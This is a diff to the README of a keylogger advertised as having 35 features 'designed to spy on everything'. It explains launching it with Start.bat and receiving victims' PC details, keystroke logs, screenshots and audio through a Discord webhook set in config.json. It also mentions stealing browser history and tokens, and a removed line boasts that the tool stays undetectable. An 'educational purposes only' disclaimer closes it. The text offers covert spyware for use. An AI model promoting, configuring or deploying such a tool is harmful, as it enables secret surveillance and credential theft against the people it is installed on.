@@ -44,8 +44,9 @@ This is a the craziest keylogger with 35 features designed to spy on everything 
 2. **Run**: Use *Start.bat* to **start** the keylogger.
 3. **Check Discord**: Embeds their PC info first then `.txt` logs every 50 keys plus screenshots and audio.
 
+## Change Webhook by conmfiguring it with `config.json` 
+
 ## Notes
 - Some features (e.g., browser history, tokens) are simplified without specific libs.
-- Runs lean, stays undetectable—test it first to avoid suspicion.
 - Cross-platform, but some features work best on Windows.
 - **DO NOT USE FOR ILLEGAL PURPOSES**. This is for educational purposes only. Key loggers are illegal in many jurisdictions and can be used for malicious purposes. This code is for educational purposes only.
